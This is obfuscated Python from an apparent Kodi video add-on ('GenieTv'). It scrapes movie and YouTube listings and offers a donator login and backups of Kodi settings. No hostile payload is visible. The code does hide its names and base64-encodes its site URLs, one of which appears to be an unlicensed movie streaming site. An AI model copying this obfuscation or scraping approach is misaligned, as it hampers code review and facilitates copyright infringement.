  for oO00oooOOoOo0 , OoOOoOooooOOo in IiI11iII1 :
   i1Iii1i1I ( OO0ooOOO0OOO , oO00oooOOoOo0 , OoOOoOooooOOo )
   if 87 - 87: OOOo0
   if 58 - 58: I1IiI % OOooOOo
   if 50 - 50: I1I1ii . OOooOOo
   if 97 - 97: O0 + I1IiI
   if 89 - 89: OOooOOo + Ooo00oOo00o * OOoo0OO0 * oO0O
   if 37 - 37: OoooooooOO - O0 - OOooOOo
   if 77 - 77: i11i1 * iIii1I11I1II1
   if 98 - 98: OOOo0 % oO0O * OoooooooOO
   if 51 - 51: iIii1I11I1II1 . I1IiI / Ooo0OO0oOO + OOooOOo
   if 33 - 33: oOO . OoOoOO00 % II1i1IiiIIi11 + OOooOOo
   if 71 - 71: Oo % i11i1
   if 98 - 98: OOoo0OO0 % i11iIiiIii % oOO + oO0O
   if 78 - 78: ii11ii1ii % Ooo0OO0oOO / II1i1IiiIIi11 - iIii1I11I1II1
   if 69 - 69: I1I1ii
   if 11 - 11: OOOo0
   if 16 - 16: oO0O + iI1Ii11iII1 * O0 % i1IIi . OOOo0
   if 67 - 67: OoooooooOO / OOOo0 * oO0O + OOoo0OO0
def OooOo0ooo ( ) :
 iIiIIIi ( 'Genre' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10073 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 iIiIIIi ( 'Most Viewed' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10077 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 iIiIIIi ( 'Box Office' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9jYXRlZ29yeS9ib3gtb2ZmaWNlLw==' ) , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 iIiIIIi ( 'Search' , '' , 10078 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 if 71 - 71: I1I1ii + oO0O
def iI1111ii1I ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oOOoO0o0oO = 'http://imoviemax.se/?s=' + ( iiI11iI ) . replace ( ' ' , '+' )
 o0Oo0oO0oOO00 = oOOoO0o0oO . lower ( )
 oo00OO0000oO ( o0Oo0oO0oOO00 )
def I1II1 ( url ) :
 oooO = [ ]
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<li class="cat-item cat-item-.+? "><a href="(.+?)">(.+?)</a><i>(.+?)</i></li>' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 , i1I1i111Ii in IiI11iII1 :
  if oO00oooOOoOo0 in oooO :
   pass
  else :
   iIiIIIi ( oO00oooOOoOo0 + ' - ' + i1I1i111Ii + ' Films' , url , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
   oooO . append ( oO00oooOOoOo0 )
   if 67 - 67: OOOo0 . i1IIi
def i1i1iI1iiiI ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<li>.+?<b>.+?</b>.+?<a href="(.+?)">(.+?)</a>.+?<span>(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 , Ooo0oOooo0 in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 + ' - Views:' + Ooo0oOooo0 , url , 10075 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
  if 61 - 61: I1IiI - i11i1 - i1IIi
  if 25 - 25: O0 * OOoo0OO0 + ii11ii1ii . OOooOOo . OOooOOo
def oo00OO0000oO ( url ) :
 oOooO = [ ]
 Oo0oO00o = I1ii1Ii1 ( url )
 next = re . compile ( "<link rel='next' href='(.+?)' />" ) . findall ( Oo0oO00o )
 for next in next :
  iIiIIIi ( 'NEXT PAGE' , next , 10074 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 IiI11iII1 = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt="(.+?)" />.+?<a href="(.+?)"><span class="player"></span></a>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , oO00oooOOoOo0 , url in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 10075 , IIIIiI11I11 , IIIIiI11I11 , '' )
  oOooO . append ( oO00oooOOoOo0 )
  if 58 - 58: OOOo0
def Ii1iI111II1I1 ( img , name , url ) :
 img = img
 name = name
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div id="(.+?)" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</iframe></div>' ) . findall ( Oo0oO00o )
 for oOOOOoOO0o , url in IiI11iII1 :
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>> before' + url
  i1II1 = ( url ) . replace ( 'player' , 'watch' ) + '&fv=&sou='
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<< after' + i1II1
  i11i1IiiiiI1i1Iii = ( oOOOOoOO0o ) . replace ( 'play-' , 'Server ' )
  oo00O00oO ( i11i1IiiiiI1i1Iii , i1II1 , 10076 , img , img , '' )
  if 87 - 87: OOooOOo
def IiI1iiiIii ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<source src="(.+?)" type="video/mp4">' ) . findall ( Oo0oO00o )
 for I1III1111iIi in IiI11iII1 :
  if '=m' in I1III1111iIi :
   I1i111I ( I1III1111iIi )
  elif 'php' in I1III1111iIi :
   IiI1iiiIii ( url )
  else :
   Oo0oO00o = I1ii1Ii1 ( I1III1111iIi )
   IiI11iII1 = re . compile ( 'content="(.+?)">' ) . findall ( Oo0oO00o )
   for OooOo0oo0O0o00O in IiI11iII1 :
    I1i111I ( I1III1111iIi )
    if 48 - 48: oOO / I1I1ii . iIii1I11I1II1 * I1IiI * Ooo0OO0oOO / i1IIi
    if 92 - 92: Oo % Oo - OOooOOo / I1IiI
    if 10 - 10: II1i1IiiIIi11 + Oo * ii11ii1ii + iIii1I11I1II1 / I1I1ii / ii11ii1ii
def iI1II ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 o0OOo0o0O0O = re . compile ( '<td id=".+?" class="today">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for OO0ooOOO0OOO , o0OO0o0oOOO0O in o0OOo0o0O0O :
  print 'there ><><><><><><><><><><><><'
  OO0ooOOO0OOO = OO0ooOOO0OOO
  IiI11iII1 = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( o0OO0o0oOOO0O ) )
  for oO00oooOOoOo0 , OoOOoOooooOOo in IiI11iII1 :
   print 'here <><><><><><><><><><><><>'
   iIiIIIi ( '[COLORred]' + OO0ooOOO0OOO + '[/COLOR] - ' + oO00oooOOoOo0 + ' - [COLORgreen]' + OoOOoOooooOOo + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 O0oO = re . compile ( '<td id=".+?" class="day">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( Oo0oO00o )
 for OO0ooOOO0OOO , iI in O0oO :
  print 'there ><><><><><><><><><><><><'
  OO0ooOOO0OOO = OO0ooOOO0OOO
  IiI11iII1 = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( iI ) )
  for oO00oooOOoOo0 , OoOOoOooooOOo in IiI11iII1 :
   print 'here <><><><><><><><><><><><>'
   iIiIIIi ( '[COLORred]' + OO0ooOOO0OOO + '[/COLOR] - ' + oO00oooOOoOo0 + ' - [COLORgreen]' + OoOOoOooooOOo + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
   if 2 - 2: oOO / II1i1IiiIIi11 . II1i1IiiIIi11 % I1I1ii
   if 11 - 11: iIii1I11I1II1
   if 20 - 20: OoOoOO00 % Oo + ii11ii1ii + oOO
def II11iIIiiiII ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 O0oO = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( Oo0oO00o )
 for O0oO in O0oO :
  oO00oooOOoOo0 = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( O0oO ) )
  for oO00oooOOoOo0 in oO00oooOOoOo0 :
   oO00oooOOoOo0 = ( oO00oooOOoOo0 ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
  url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( O0oO ) )
  for url in url :
   url = 'https://www.youtube.com/w' + url
  OoOoo00Ooo00 = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( O0oO ) )
  for OoOoo00Ooo00 in OoOoo00Ooo00 :
   OoOoo00Ooo00 = 'http:' + OoOoo00Ooo00
  oo00O00oO ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , '' , '' )
  if 57 - 57: I1I1ii
  if 32 - 32: oO0O - Oo % OoooooooOO . II1i1IiiIIi11 / iI1Ii11iII1 + OOOo0
  if 76 - 76: oOO
  if 73 - 73: O0 * II1i1IiiIIi11 + oO0O + oOO
def Ii ( url ) :
 if 100 - 100: I1I1ii + i11i1 + i11i1
 I1ii1I1iiii = [ ]
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div class="explore-list">.+?<div class="el-img"><a href="(.+?)" class=".+?"><img src="(.+?)" alt=".+?<h3>(.+?)</h3><p>(.+?)</p></div>' , re . DOTALL ) . findall ( Oo0oO00o )
 for I1III1111iIi , IIIIiI11I11 , oO00oooOOoOo0 , iiI in IiI11iII1 :
  oO00oooOOoOo0 = ( oO00oooOOoOo0 ) . replace ( '&#039;' , '\'' ) . replace ( '&' , '&' ) . replace ( '&quot;' , '"' )
  oOIIiIi = I1ii1Ii1 ( I1III1111iIi )
  IIII11I1I = re . compile ( '<!-- # player # -->.+?<iframe title=".+?".+?src="http://www.youtube.com/embed/(.+?)?autohide.+?<!-- detail box -->(.+?)</div>' , re . DOTALL ) . findall ( oOIIiIi )
  for OOoOooOoOOOoo , Iiii1iI1i in IIII11I1I :
   I1ii1ii11i1I = re . compile ( '<p>(.+?)</p>' , re . DOTALL ) . findall ( str ( Iiii1iI1i ) )
   for o0OoOO in I1ii1ii11i1I :
    if oO00oooOOoOo0 in I1ii1I1iiii :
     pass
    else :
     oo00O00oO ( oO00oooOOoOo0 , OOoOooOoOOOoo , 8043 , IIIIiI11I11 , IIIIiI11I11 , o0OoOO )
     i1IIIiiII1 ( 'movies' , 'INFO' )
     I1ii1I1iiii . append ( oO00oooOOoOo0 )
     if 55 - 55: oOO - OOoo0OO0 + OoOoOO00 + II1i1IiiIIi11 % oO0O
     if 41 - 41: i1IIi - OOoo0OO0 - oO0O
def III11I1 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for url , OOOO0OOO , o0OoOO , i1i1ii , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 10065 , OOOO0OOO , i1i1ii , o0OoOO )
 i1IIIiiII1 ( 'movies' , 'INFO' )
 if 46 - 46: I1IiI + Ooo00oOo00o
def o0o0O ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oOOoO0o0oO = 'https://www.youtube.com/results?search_query=' + ( iiI11iI ) . replace ( ' ' , '+' )
 o0Oo0oO0oOO00 = oOOoO0o0oO . lower ( )
 Oo0oO00o = I1ii1Ii1 ( o0Oo0oO0oOO00 )
 IiI11iII1 = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( Oo0oO00o )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO in next :
  ooooO0oOoOOoO = 'https://www.youtube.com' + ooooO0oOoOOoO
  iIiIIIi ( '[COLORgreen] NEXT [/COLOR]' , ooooO0oOoOOoO , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for IIIIiI11I11 , ooooO0oOoOOoO , oO00oooOOoOo0 , I1i11i , Iiii1iI1i in IiI11iII1 :
  Ooo . append ( oO00oooOOoOo0 )
  i1IIIiiII1 ( 'tvshows' , 'INFO' )
  OoOoo00Ooo00 = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + OoOoo00Ooo00
  ooooO0oOoOOoO = 'http://www.youtube.com' + ooooO0oOoOOoO
  oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( ooooO0oOoOOoO ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , OoOoo00Ooo00 , Iiii1iI1i )
 else :
  IiI11iII1 = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
  for IIIIiI11I11 , ooooO0oOoOOoO , oO00oooOOoOo0 , I1i11i in IiI11iII1 :
   print 'im doing it'
   i1IIIiiII1 ( 'tvshows' , 'INFO' )
   OoOoo00Ooo00 = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
   ooooO0oOoOOoO = 'http://www.youtube.com' + ooooO0oOoOOoO
   if '&' in ooooO0oOoOOoO :
    print ' i got here'
    Oo0oO00o = I1ii1Ii1 ( ooooO0oOoOOoO )
    O0oO = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( Oo0oO00o )
    for O0oO in O0oO :
     oO00oooOOoOo0 = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( O0oO ) )
     for oO00oooOOoOo0 in oO00oooOOoOo0 :
      oO00oooOOoOo0 = ( oO00oooOOoOo0 ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
     ooooO0oOoOOoO = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( O0oO ) )
     for ooooO0oOoOOoO in ooooO0oOoOOoO :
      ooooO0oOoOOoO = 'https://www.youtube.com/w' + ooooO0oOoOOoO
     OoOoo00Ooo00 = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( O0oO ) )
     for OoOoo00Ooo00 in OoOoo00Ooo00 :
      OoOoo00Ooo00 = 'http:' + OoOoo00Ooo00
     oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( ooooO0oOoOOoO ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , i1iiIII111ii , '' )
   elif oO00oooOOoOo0 in Ooo :
    pass
   elif 'user' in ooooO0oOoOOoO or 'elete' in oO00oooOOoOo0 :
    pass
   elif 'hannel' in ooooO0oOoOOoO :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + ooooO0oOoOOoO
    Oo0oO00o = I1ii1Ii1 ( ooooO0oOoOOoO )
    IiIi = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( Oo0oO00o )
    for IIIIiI11I11 , ooooO0oOoOOoO , oO00oooOOoOo0 in IiIi :
     if 'outube' in ooooO0oOoOOoO or 'list' in ooooO0oOoOOoO :
      pass
     elif 'atch' in ooooO0oOoOOoO :
      ooooO0oOoOOoO = ( ooooO0oOoOOoO ) . replace ( '/watch?v=' , '' )
      oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( ooooO0oOoOOoO ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + IIIIiI11I11 , 'http:' + IIIIiI11I11 , '' )
     else :
      pass
   else :
    oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( ooooO0oOoOOoO ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , OoOoo00Ooo00 , '' )
    if 87 - 87: ii11ii1ii - ii11ii1ii - II1i1IiiIIi11 + Ooo0OO0oOO
def OOooo ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( Oo0oO00o )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( Oo0oO00o )
 for url in next :
  url = 'https://www.youtube.com' + url
  iIiIIIi ( '[COLORgreen] NEXT [/COLOR]' , url , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for IIIIiI11I11 , url , oO00oooOOoOo0 , I1i11i , Iiii1iI1i in IiI11iII1 :
  Ooo . append ( oO00oooOOoOo0 )
  i1IIIiiII1 ( 'tvshows' , 'INFO' )
  OoOoo00Ooo00 = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + OoOoo00Ooo00
  url = 'http://www.youtube.com' + url
  oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , OoOoo00Ooo00 , Iiii1iI1i )
 else :
  IiI11iII1 = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
  for IIIIiI11I11 , url , oO00oooOOoOo0 , I1i11i in IiI11iII1 :
   i1IIIiiII1 ( 'tvshows' , 'INFO' )
   OoOoo00Ooo00 = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
   url = 'http://www.youtube.com' + url
   if '&' in url :
    Oo0oO00o = I1ii1Ii1 ( url )
    O0oO = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( Oo0oO00o )
    for O0oO in O0oO :
     oO00oooOOoOo0 = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( O0oO ) )
     for oO00oooOOoOo0 in oO00oooOOoOo0 :
      oO00oooOOoOo0 = ( oO00oooOOoOo0 ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
     url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( O0oO ) )
     for url in url :
      url = 'https://www.youtube.com/w' + url
     OoOoo00Ooo00 = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( O0oO ) )
     for OoOoo00Ooo00 in OoOoo00Ooo00 :
      OoOoo00Ooo00 = 'http:' + OoOoo00Ooo00
     oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , i1iiIII111ii , '' )
   elif oO00oooOOoOo0 in Ooo :
    pass
   elif 'user' in url or 'elete' in oO00oooOOoOo0 :
    pass
   elif 'hannel' in url :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + url
    Oo0oO00o = I1ii1Ii1 ( url )
    IiIi = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( Oo0oO00o )
    for IIIIiI11I11 , url , oO00oooOOoOo0 in IiIi :
     if 'outube' in url or 'list' in url :
      pass
     elif 'atch' in url :
      url = ( url ) . replace ( '/watch?v=' , '' )
      oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + IIIIiI11I11 , 'http:' + IIIIiI11I11 , '' )
     else :
      pass
   else :
    oo00O00oO ( '[COLORred]' + I1i11i + '[/COLOR]' + '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , OoOoo00Ooo00 , OoOoo00Ooo00 , '' )
    if 31 - 31: OOooOOo % Ooo00oOo00o
    if 14 - 14: Ooo0OO0oOO / Ooo0OO0oOO % oOO
def ooO ( ) :
 if oo0o0O00 == 'insert_password' :
  oOOoo00O0O . ok ( '[COLORgreen]Donators Login[/COLOR]' , 'You need to set username and password to access this' , 'These are unique and provided to donators to help with server and stream costs' , 'Donate @ [COLORgreen]http://architects.x10host.com[/COLOR]' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
 else :
  ii = open ( I11II1i )
  IiI11iII1 = re . compile ( 'plugin.video.GenieTv.+?2Flive%2F(.+?)%2F(.+?)%2F' ) . findall ( str ( ii ) )
  for OO0O0Ooo , oOoO0 in IiI11iII1 :
   if OO0O0Ooo == 'needs replacing' or oOoO0 == 'needs replacing' :
    Oo0 ( )
  iIiIIIi ( '[COLORgreen]DONATORS LIST[/COLOR]' , iiI1IiI + '/thelistnew.m3u' , 7080 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
  if 83 - 83: i11iIiiIii % OOooOOo % oOO
def Ii1II1I11i1 ( ) :
 i1iiIIiiI111 . ok ( '[COLOR=white]ReCreate Addons.ini[/COLOR]' , 'If it doesnt work ensure login details are correct and retry' , '' , 'This will allow access to streams in guide without linking to favourites' )
 xbmc . executebuiltin ( "XBMC.RunScript(" + O0o0Oo + ")" )
 Oo0 ( )
 i1iiIIiiI111 . ok ( '[COLOR=yellow]Done[/COLOR]' , 'Done' , 'Easy as that' , 'Now Go to guide and it should link your GTV streams' )
 if 59 - 59: Ooo0OO0oOO % iIii1I11I1II1 . i1IIi
def iiIi1i ( ) :
 try :
  I1i11111i1i11 = gui . TVGuide ( )
  I1i11111i1i11 . doModal ( )
  del I1i11111i1i11
  if 77 - 77: ii11ii1ii + Ooo00oOo00o / Ooo0OO0oOO + O0 * OOooOOo
 except :
  import sys
  import traceback as tb
  ( I1ii11 , oOoOoOoo0 , traceback ) = sys . exc_info ( )
  tb . print_exception ( I1ii11 , oOoOoOoo0 , traceback )
  if 34 - 34: I1IiI - i11i1 + O0 . oO0O
def iIi1i1iIi1iI ( ) :
 iIiIIIi ( 'Full Backup' , '' , 10061 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your Full System' )
 if os . path . exists ( OOOO ) :
  iIiIIIi ( 'Backup Genie Favourites' , ooooO0oOoOOoO , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites' )
 if os . path . exists ( I1IIIii ) :
  iIiIIIi ( 'Backup Ivue Config' , I1IIIii , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your master.db' )
 if os . path . exists ( oOoOooOo0o0 ) :
  iIiIIIi ( 'Backup Kodi Favourites' , oOoOooOo0o0 , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites.xml' )
  if 26 - 26: OoooooooOO * OOOo0 + i11i1
  if 24 - 24: i11iIiiIii % iIii1I11I1II1 + i11i1 / i11iIiiIii
  if 70 - 70: Ooo00oOo00o * O0 . OOoo0OO0 + OOOo0 . iI1Ii11iII1
zip = o0oO0 . getSetting ( 'zip' )
Ii1iIiII1Ii = xbmc . translatePath ( os . path . join ( zip ) )
def Iii1II1iiiiI ( ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if not os . path . exists ( zip ) :
  i1iiIIiiI111 . ok ( '[COLOR=white]Origin[/COLOR]' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' , '' , '' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
  if 96 - 96: I1IiI . OOooOOo - oOO
  if 99 - 99: iI1Ii11iII1 . Oo - oO0O % oO0O * O0 . OoOoOO00
  if 4 - 4: oO0O
def OO0oOOoo ( name , url , description ) :
 if 'Backup' in name :
  if 'Genie' in name :
   url = OOOO
  elif 'Ivue' in name :
   url = I1IIIii
  elif 'Kodi' in name :
   url = oOoOooOo0o0
  Iii1II1iiiiI ( )
  oOOO00o000o = open ( url ) . read ( )
  iIi11i1 = os . path . join ( Ii1iIiII1Ii , description . split ( 'Your ' ) [ 1 ] )
  oO00oo0o00o0o = open ( iIi11i1 , mode = 'w' )
  oO00oo0o00o0o . write ( oOOO00o000o )
  oO00oo0o00o0o . close ( )
 else :
  if 'guisettings.xml' in description :
   IiIIIIIi = open ( os . path . join ( Ii1iIiII1Ii , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   IiIi1iIIi1 = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % skin
   IiI11iII1 = re . compile ( IiIi1iIIi1 ) . findall ( IiIIIIIi )
   for type , O0OoO0ooOO0o , OoOo0oOooOoOO in IiI11iII1 :
    OoOo0oOooOoOO = OoOo0oOooOoOO . replace ( '&quot;' , '' ) . replace ( '&' , '&' )
    xbmc . executebuiltin ( "Skin.Se	t%s(%s,%s)" % ( type . title ( ) , O0OoO0ooOO0o , OoOo0oOooOoOO ) )
  else :
   iIi11i1 = os . path . join ( url )
   oOOO00o000o = open ( os . path . join ( Ii1iIiII1Ii , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   oO00oo0o00o0o = open ( iIi11i1 , mode = 'w' )
   oO00oo0o00o0o . write ( oOOO00o000o )
   oO00oo0o00o0o . close ( )
 i1iiIIiiI111 . ok ( "[COLOR=white]Origin[/COLOR]" , "" , 'All Done !' , '' )
 if 60 - 60: OoooooooOO % oO0O * i1IIi
 if 1 - 1: OOOo0 / iI1Ii11iII1 * oOO
 if 1 - 1: OOoo0OO0 * OOooOOo . I1IiI / O0
 if 100 - 100: I1I1ii . OOooOOo * Oo % O0 * O0
def IIIii1 ( ) :
 Oooo0 = 1
 Iii1II1iiiiI ( )
 oOOOooo = xbmc . translatePath ( os . path . join ( Ii1iIiII1Ii , 'Build Backup' , 'Full Backup' , '' ) )
 I1i1iiiII1i = xbmc . translatePath ( os . path . join ( Ii1iIiII1Ii , 'Build Backup' , 'my_full_backup.zip' ) )
 oO0oO0 = xbmc . translatePath ( os . path . join ( Ii1iIiII1Ii , 'Build Backup' , 'my_full_backup_GUI_Settings.zip' ) )
 if not os . path . exists ( oOOOooo ) :
  os . makedirs ( oOOOooo )
 i1i1IIIIi1i = oOOoo00O0O . input ( 'Enter a name for this backup' , type = xbmcgui . INPUT_ALPHANUM )
 if ( not i1i1IIIIi1i ) : return False , 0
 Ii11iiI = i1i1IIIIi1i
 IIi1iiii1iI = xbmc . translatePath ( os . path . join ( oOOOooo , Ii11iiI + '.zip' ) )
 iIiiii = [ 'plugin.video.GenieTv' ]
 O0000OOO0 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
 ooo0 = [ 'plugin.video.GenieTv' , 'repository.origin' , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 oO000oOo00o0o = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' ]
 O00oO0 = "Creating full backup of existing build"
 O0Oo00OoOo = "Creating Community Build"
 ii1ii111 = "Archiving..."
 i11111I1I = ""
 ii1 = "Please Wait"
